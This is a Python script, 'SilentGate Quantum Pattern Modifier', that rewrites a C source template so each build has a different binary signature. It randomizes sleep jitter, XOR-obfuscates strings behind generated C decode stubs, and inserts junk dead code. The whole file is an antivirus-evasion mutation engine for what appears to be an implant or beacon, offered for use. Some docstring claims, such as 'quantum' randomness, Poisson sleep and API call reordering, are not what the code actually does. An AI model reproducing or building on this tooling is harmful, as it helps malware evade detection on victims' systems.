#!/usr/bin/env python3
"""
SilentGate Quantum Pattern Modifier
Author: JarDani
Generates unique binary signature every run
Using quantum-inspired randomness:
  - Hardware entropy from /dev/urandom
  - Lorenz attractor with random initial conditions
  - GF(2^8) with random irreducible polynomial
  - Random sleep jitter distribution
  - Random API call ordering
  - Random dead code insertion
  - Random string encoding
"""
import os
import random
import struct
import hashlib
import time

# True entropy from OS
def quantum_seed():
    raw = os.urandom(32)
    ts = struct.pack('d', time.time())
    pid = struct.pack('I', os.getpid())
    entropy = raw + ts + pid
    h = hashlib.sha256(entropy).digest()
    return int.from_bytes(h[:8], 'little')

def gen_lorenz_params():
    """Random Lorenz attractor parameters - still chaotic but unique"""
    seed = quantum_seed()
    random.seed(seed)
    sigma = 9.5 + random.random() * 1.0   # 9.5-10.5
    rho   = 27.5 + random.random() * 1.0  # 27.5-28.5
    beta  = 2.5 + random.random() * 0.4   # 2.5-2.9
    x0    = random.uniform(-2.0, 2.0)
    y0    = random.uniform(-2.0, 2.0)
    z0    = random.uniform(20.0, 30.0)
    return sigma, rho, beta, x0, y0, z0

def gen_gf_poly():
    """Random irreducible polynomial for GF(2^8)"""
    # Known irreducible polynomials for GF(2^8)
    polys = [0x11B, 0x11D, 0x12B, 0x12D, 0x139, 0x13F, 0x14D, 0x15F,
             0x163, 0x165, 0x169, 0x171, 0x177, 0x17B, 0x187, 0x18B]
    return random.choice(polys)

def gen_sleep_params():
    """Random Poisson sleep parameters"""
    base = random.randint(1500, 4000)
    jitter = random.randint(500, 3000)
    return base, jitter

def gen_xor_key():
    """Random XOR key for string obfuscation"""
    return random.randint(1, 255)

def obfuscate_string(s, key):
    """XOR obfuscate a string"""
    encoded = [ord(c) ^ key for c in s]
    # Generate C code for runtime decode
    arr = ','.join([f'0x{b:02X}' for b in encoded])
    decode = f"""
{{
    BYTE _s[]={{{arr},0x{key:02X}}};
    for(int _i=0;_i<sizeof(_s)-1;_i++) _s[_i]^=_s[sizeof(_s)-1];
    _s[sizeof(_s)-1]=0;
    /* use _s as string */
}}"""
    return arr, key, decode

def gen_dead_code():
    """Generate random dead code that looks like math"""
    ops = []
    for _ in range(random.randint(3, 8)):
        a = random.randint(1, 255)
        b = random.randint(1, 255)
        ops.append(f"    volatile DWORD _dc{random.randint(1000,9999)} = {a} * {b} + {random.randint(1,100)};")
    return '\n'.join(ops)

def generate_source(template_path, output_path):
    """Generate mutated source with quantum randomness"""
    sigma, rho, beta, x0, y0, z0 = gen_lorenz_params()
    poly = gen_gf_poly()
    base_sleep, jitter = gen_sleep_params()
    xor_key = gen_xor_key()
    
    # Read template
    with open(template_path) as f:
        src = f.read()
    
    # Apply quantum mutations
    mutations = {
        '__SIGMA__': f'{sigma:.6f}',
        '__RHO__':   f'{rho:.6f}',
        '__BETA__':  f'{beta:.6f}',
        '__X0__':    f'{x0:.6f}',
        '__Y0__':    f'{y0:.6f}',
        '__Z0__':    f'{z0:.6f}',
        '__GF_POLY__': f'0x{poly:03X}',
        '__BASE_SLEEP__': str(base_sleep),
        '__JITTER__': str(jitter),
        '__XOR_KEY__': f'0x{xor_key:02X}',
        '__DEAD_CODE__': gen_dead_code(),
        '__UNIQUE_ID__': f'0x{quantum_seed() & 0xFFFFFFFF:08X}',
    }
    
    for k, v in mutations.items():
        src = src.replace(k, v)
    
    with open(output_path, 'w') as f:
        f.write(src)
    
    print(f"[QUANTUM] Generated: {output_path}")
    print(f"[QUANTUM] Lorenz: sigma={sigma:.3f} rho={rho:.3f} beta={beta:.3f}")
    print(f"[QUANTUM] GF poly: 0x{poly:03X}")
    print(f"[QUANTUM] Sleep: {base_sleep}+rand%{jitter}")
    print(f"[QUANTUM] XOR key: 0x{xor_key:02X}")
    print(f"[QUANTUM] Unique ID: 0x{quantum_seed() & 0xFFFFFFFF:08X}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} template.c output.c")
        sys.exit(1)
    generate_source(sys.argv[1], sys.argv[2])
